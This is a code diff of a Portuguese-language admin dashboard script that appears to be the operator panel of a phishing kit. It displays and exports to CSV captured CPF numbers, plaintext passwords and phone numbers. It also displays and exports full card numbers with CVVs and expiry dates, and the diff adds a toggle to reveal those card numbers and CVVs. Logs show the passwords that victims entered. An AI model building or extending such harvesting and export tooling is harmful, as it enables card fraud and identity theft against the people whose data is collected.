+function exportUsersCSV() { if(!usersData.length) { showToast('Sem dados'); return; } let csv = "CPF,SENHA,TELEFONE,DATA\n"; usersData.forEach(u => csv += `"${u.cpf}","${u.senha || ''}","${u.telefone || ''}","${u.data_senha || u.data_cpf || ''}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `usuarios_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado'); }
 
-async function loadCards() { if(!adminToken) return; try { const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); cardsData = data.cartoes || []; document.getElementById('cardsTable').innerHTML = cardsData.map(c => `<tr><td>${formatCPF(c.cpf)}</td><td>**** **** **** ${c.numero_cartao ? c.numero_cartao.slice(-4) : '****'}</td><td>${escapeHtml(c.nome_titular)}</td><td>***</td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Excluir</button></td></tr>`).join(''); } catch(e) { console.error(e); } }
+// CARTÕES
+async function loadCards() { if(!adminToken) return; try { const res = await fetch('/api/admin/cartoes', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); cardsData = data.cartoes || []; renderCards(); } catch(e) { console.error(e); } }
+function renderCards() { const tbody = document.getElementById('cardsTable'); if(!cardsData.length) { tbody.innerHTML = '<tr><td colspan="7">Nenhum cartão</td></tr>'; return; } tbody.innerHTML = cardsData.map(c => `<tr><td>${formatCPF(c.cpf)}</td><td>${getDisplayCardNumber(c.numero_cartao)}</td><td>${escapeHtml(c.nome_titular)}</td><td>${showCardNumbers ? c.cvv : '***'}</td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Excluir</button></td></tr>`).join(''); }
+function filterCards() { const term = document.getElementById('searchCards')?.value.toLowerCase() || ''; const filtered = cardsData.filter(c => (c.cpf || '').toLowerCase().includes(term)); const tbody = document.getElementById('cardsTable'); if(!filtered.length) { tbody.innerHTML = '<tr><td colspan="7">Nenhum resultado</td></tr>'; return; } tbody.innerHTML = filtered.map(c => `<tr><td>${formatCPF(c.cpf)}</td><td>${getDisplayCardNumber(c.numero_cartao)}</td><td>${escapeHtml(c.nome_titular)}</td><td>${showCardNumbers ? c.cvv : '***'}</td><td>${c.validade || '-'}</td><td>${c.created_at ? new Date(c.created_at).toLocaleDateString() : '-'}</td><td><button class="btn-delete" onclick="deleteCard(${c.id})">Excluir</button></td></tr>`).join(''); }
 async function deleteCard(id) { if(!confirm('Deletar cartão?')) return; await fetch(`/api/admin/cartoes/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Cartão deletado'); }
+async function clearAllCards() { if(!confirm('DELETAR TODOS OS CARTÕES?')) return; await fetch('/api/admin/clear-cards', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadCards(); showToast('Todos os cartões deletados'); }
+function exportCardsCSV() { if(!cardsData.length) { showToast('Sem dados'); return; } let csv = "CPF,NOME,CARTAO,CVV,VALIDADE,DATA\n"; cardsData.forEach(c => csv += `"${c.cpf}","${c.nome_titular}","${c.numero_cartao}","${c.cvv}","${c.validade}","${c.created_at}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `cartoes_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado'); }
 
+// PAGAMENTOS
 async function loadPaymentsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/payments', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); paymentsData = data.payments || []; renderPaymentsFull(); } catch(e) { console.error(e); } }
-function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum pagamento</div>'; return; } container.innerHTML = `<table class="payment-table"><thead><tr><th>CPF</th><th>Valor</th><th>Status</th><th>Data</th><th>Ações</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${formatCPF(p.cpf)}</td><td>R$ ${parseFloat(p.valor).toFixed(2)}</td><td><span class="${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Excluir</button></td></tr>`).join('')}</tbody></table>`; }
+function renderPaymentsFull() { const container = document.getElementById('paymentsList'); if(!paymentsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">Nenhum pagamento</div>'; return; } container.innerHTML = `<table class="payment-table"><thead><tr><th>CPF</th><th>Valor</th><th>Status</th><th>Data</th><th>Ações</th></tr></thead><tbody>${paymentsData.map(p => `<tr><td>${formatCPF(p.cpf)}</td><td>R$ ${parseFloat(p.valor).toFixed(2)}</td><td><span class="${p.status === 'paid' ? 'badge-paid' : 'badge-pending'}">${p.status === 'paid' ? 'PAGO' : 'PENDENTE'}</span></td><td>${new Date(p.data_solicitacao).toLocaleString()}</td><td><button class="btn-delete" onclick="deletePayment(${p.id})">Excluir</button></td></tr>`).join('')}</tbody></table>`; }
 async function deletePayment(id) { if(!confirm('Deletar pagamento?')) return; await fetch(`/api/admin/payments/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); await loadDashboardData(); showToast('Pagamento deletado'); }
+async function clearAllPayments() { if(!confirm('DELETAR TODOS OS PAGAMENTOS?')) return; await fetch('/api/admin/clear-payments', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadPaymentsFull(); await loadDashboardData(); showToast('Todos os pagamentos deletados'); }
+function exportPaymentsCSV() { if(!paymentsData.length) { showToast('Sem dados'); return; } let csv = "CPF,VALOR,STATUS,TIPO,DATA\n"; paymentsData.forEach(p => csv += `"${p.cpf}","${p.valor}","${p.status}","${p.tipo_pagamento}","${p.data_solicitacao}"\n`); const blob = new Blob([csv], { type: 'text/csv' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = `pagamentos_${new Date().toISOString().slice(0,19)}.csv`; link.click(); showToast('CSV exportado'); }
 
+// LOGS
 async function loadLogsFull() { if(!adminToken) return; try { const res = await fetch('/api/admin/logs', { headers: { 'Authorization': `Bearer ${adminToken}` } }); const data = await res.json(); logsData = data.logs || []; renderLogsFull(); } catch(e) { console.error(e); } }
-function renderLogsFull() { const container = document.getElementById('logsList'); if(!logsData.length) { container.innerHTML = '<div style="text-align:center; padding:40px;">Nenhum log</div>'; return; } container.innerHTML = logsData.map(log => `<div class="log-item" style="padding:12px; border-bottom:1px solid var(--border);"><span style="color:var(--text-muted);">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span> <button class="btn-delete" onclick="deleteLog(${log.id})" style="margin-left:auto;">Excluir</button></div>`).join(''); }
+function renderLogsFull() { const container = document.getElementById('logsList'); if(!logsData.length) { container.innerHTML = '<div style="padding:40px; text-align:center;">Nenhum log</div>'; return; } container.innerHTML = logsData.map(log => `<div style="padding:12px; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center;"><span><span style="color:var(--text-muted);">${new Date(log.data).toLocaleString()}</span> <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-warning'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span> <span>${formatCPF(log.cpf)}</span> ${log.senha ? `<span class="badge-warning">Senha: ${log.senha}</span>` : ''}</span><button class="btn-delete" onclick="deleteLog(${log.id})">Excluir</button></div>`).join(''); }
 async function deleteLog(id) { if(!confirm('Deletar log?')) return; await fetch(`/api/admin/logs/${id}`, { method: 'DELETE', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('Log deletado'); }
+async function clearAllLogs() { if(!confirm('DELETAR TODOS OS LOGS?')) return; await fetch('/api/admin/clear-logs', { method: 'POST', headers: { 'Authorization': `Bearer ${adminToken}` } }); await loadLogsFull(); showToast('Todos os logs deletados'); }
 
 document.getElementById('addUserForm')?.addEventListener('submit', async (e) => { e.preventDefault(); const username = document.getElementById('newUsername').value; const password = document.getElementById('newPassword').value; await fetch('/api/admin/add-user', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ username, password }) }); showToast('Admin adicionado'); e.target.reset(); });
+
+async function changeAdminPassword() { const current = document.getElementById('currentPass').value; const newPass = document.getElementById('newPass').value; const confirm = document.getElementById('confirmPass').value; if(!current || !newPass || newPass.length < 6 || newPass !== confirm) { document.getElementById('passwordMsg').innerHTML = '<span style="color:#ef4444;">Senha atual e nova (min 6) obrigatórias</span>'; setTimeout(() => document.getElementById('passwordMsg').innerHTML = '', 2000); return; } const res = await fetch('/api/admin/change-password', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` }, body: JSON.stringify({ senha_antiga: current, nova_senha: newPass }) }); const data = await res.json(); if(data.success) { document.getElementById('passwordMsg').innerHTML = '<span style="color:#10b981;">Senha atualizada!</span>'; document.getElementById('currentPass').value = ''; document.getElementById('newPass').value = ''; document.getElementById('confirmPass').value = ''; } else { document.getElementById('passwordMsg').innerHTML = `<span style="color:#ef4444;">${data.error}</span>`; } setTimeout(() => document.getElementById('passwordMsg').innerHTML = '', 2000); }
 
 function switchTab(tabName) {
     document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
